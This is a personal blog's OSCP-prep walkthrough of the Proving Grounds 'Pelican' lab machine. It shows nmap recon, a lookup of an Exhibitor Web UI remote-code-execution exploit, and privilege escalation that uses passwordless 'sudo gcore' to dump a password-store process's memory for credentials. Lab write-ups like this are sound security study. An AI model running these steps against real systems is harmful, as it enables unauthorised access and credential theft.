{"componentChunkName":"component---src-templates-post-template-tsx","path":"/240913/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1. Recon</h2>\n<ul>\n<li>basic nmap scan</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ sudo nmap 192.168.164.98 -p- -T4            \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 17:07 EDT\r\nStats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\r\nSYN Stealth Scan Timing: About 0.59% done\r\nStats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\r\nSYN Stealth Scan Timing: About 1.63% done; ETC: 17:08 (0:01:00 remaining)\r\nStats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\r\nSYN Stealth Scan Timing: About 2.27% done; ETC: 17:08 (0:00:43 remaining)\r\nNmap scan report for 192.168.164.98\r\nHost is up (0.032s latency).\r\nNot shown: 65526 closed tcp ports (reset)\r\nPORT      STATE SERVICE\r\n22/tcp    open  ssh\r\n139/tcp   open  netbios-ssn\r\n445/tcp   open  microsoft-ds\r\n631/tcp   open  ipp\r\n2181/tcp  open  eforward\r\n2222/tcp  open  EtherNetIP-1\r\n8080/tcp  open  http-proxy\r\n8081/tcp  open  blackice-icecap\r\n46295/tcp open  unknown\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 19.46 seconds\r\n</code></pre></div>\n<p>Oh my gosh.</p>\n<ul>\n<li>port 22 (ssh)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">PORT      STATE SERVICE     VERSION\r\n22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)\r\n|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)\r\n|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)</code></pre></div>\n<ul>\n<li>port 139, 445 (samba)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r\n445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)\r\n\r\nHost script results:\r\n|_clock-skew: mean: 1h20m02s, deviation: 2h18m34s, median: 1s\r\n| smb-os-discovery: \r\n|   OS: Windows 6.1 (Samba 4.9.5-Debian)\r\n|   Computer name: pelican\r\n|   NetBIOS computer name: PELICAN\\x00\r\n|   Domain name: \\x00\r\n|   FQDN: pelican\r\n|_  System time: 2024-09-11T17:09:43-04:00\r\n| smb-security-mode: \r\n|   account_used: guest\r\n|   authentication_level: user\r\n|   challenge_response: supported\r\n|_  message_signing: disabled (dangerous, but default)\r\n| smb2-time: \r\n|   date: 2024-09-11T21:09:41\r\n|_  start_date: N/A\r\n| smb2-security-mode: \r\n|   3:1:1: \r\n|_    Message signing enabled but not required</code></pre></div>\n<ul>\n<li>port 631 (ipp)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">631/tcp   open  ipp         CUPS 2.2\r\n|_http-title: Forbidden - CUPS v2.2.10\r\n| http-methods: \r\n|_  Potentially risky methods: PUT\r\n|_http-server-header: CUPS/2.2 IPP/2.1</code></pre></div>\n<ul>\n<li>port 2191 (zookeeper)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)</code></pre></div>\n<ul>\n<li>port 2222 (ssh)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)\r\n|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)\r\n|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)</code></pre></div>\n<ul>\n<li>port 8080, 8081 (http)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">8080/tcp  open  http        Jetty 1.0\r\n|_http-title: Error 404 Not Found\r\n|_http-server-header: Jetty(1.0)\r\n8081/tcp  open  http        nginx 1.14.2\r\n|_http-server-header: nginx/1.14.2\r\n|_http-title: Did not follow redirect to http://192.168.164.98:8080/exhibitor/v1/ui/index.html</code></pre></div>\n<ul>\n<li>port 46295 (java-rmi)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">46295/tcp open  java-rmi    Java RMI</code></pre></div>\n<p>So let’s start enueration…</p>\n<h2>2. Enumeration</h2>\n<ul>\n<li>webapp</li>\n</ul>\n<p>![[../contentImages/pelican/1.png]]</p>\n<p>Somehow this should be connected to port 2191 (zookeeper).</p>\n<p>Searching with keyword exhibitor:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ searchsploit exhibitor\r\nExhibitor Web UI 1.7.1 - Remote Code Execution java/webapps/48654.txt</code></pre></div>\n<p>Let’s take a closer look. I got a script from:</p>\n<p><a href=\"https://github.com/thehunt1s0n/Exihibitor-RCE.git\" target=\"_blank\" rel=\"nofollow\">https://github.com/thehunt1s0n/Exihibitor-RCE.git</a></p>\n<p>Then:</p>\n<p>![[../contentImages/pelican/3.png]]</p>\n<p>Got a shell.</p>\n<p>![[../contentImages/pelican/4.png]]</p>\n<p>Or</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n$ sudo -l\r\nsudo -l\r\nMatching Defaults entries for charles on pelican:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser charles may run the following commands on pelican:\r\n    (ALL) NOPASSWD: /usr/bin/gcore\r\n</code></pre></div>\n<p>So maybe we should read password-store with gcore.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">ps aux | grep \"password-store\"\r\n\r\n(found out that PID is 490)\r\n\r\nsudo /usr/bin/gcore 490\r\n\r\n(created core.490)\r\n\r\nstrings ./core.490\r\n\r\n(The `strings` command in Linux is used to extract and display readable **printable characters** (i.e., strings of text) from binary files or any non-text files)</code></pre></div>\n<p>![[../contentImages/pelican/5.png]]</p>\n<p>So, let’s try to upgrade privielge</p>\n<p>![[../contentImages/pelican/6.png]]</p>\n<p>Done!</p>\n<p>Tipp: try to undestand gtfobins more correctly.</p>","frontmatter":{"title":"OSCP Prep: Proving Grounds : Pelican","summary":"Solving Pelican machine from Proving Grounds","date":"2024.09.13.","before":"2024.09.10.","after":"2024.09.16.","categories":["C-SEC","proving_grounds","full-machine","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA4ElEQVR42o3LXUvCYBjG8ec7RYUZCqmD5g6KvlOBW8cmbM++goQRHXYWCM01E+msgyFt4bT5ita/Z54Xu+EH13XBLTStjmFcUD055ahY4VgzKNTqFKo6B2rbV/bK2t9KNQ4rOiX9jLJ+jvDabfzOHd3bDt79A0GrRa/RwLcsetY1nmnxrPr/TF5Mk8fLK0T0OeI9HDGdTEiV2duQr8An7QfMB/1cZq8Bq+GAsPuEGI8jkiRmtUwJ44T5eslis975ZpvL9mdDdlH8gbBtG9eVSClxFek4uBnp7HJe2e9Ns8kva/suIUWUFEkAAAAASUVORK5CYII="},"images":{"fallback":{"src":"/static/7bd486d1a195b9c705acf43286f9e771/a7c9f/1.png","srcSet":"/static/7bd486d1a195b9c705acf43286f9e771/918ec/1.png 477w,\n/static/7bd486d1a195b9c705acf43286f9e771/1779a/1.png 954w,\n/static/7bd486d1a195b9c705acf43286f9e771/a7c9f/1.png 1907w","sizes":"(min-width: 1907px) 1907px, 100vw"},"sources":[{"srcSet":"/static/7bd486d1a195b9c705acf43286f9e771/79368/1.webp 477w,\n/static/7bd486d1a195b9c705acf43286f9e771/d9cf4/1.webp 954w,\n/static/7bd486d1a195b9c705acf43286f9e771/828cd/1.webp 1907w","type":"image/webp","sizes":"(min-width: 1907px) 1907px, 100vw"}]},"width":1907,"height":508}},"publicURL":"/static/7bd486d1a195b9c705acf43286f9e771/1.png"}}}}]}},"pageContext":{"slug":"/240913/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}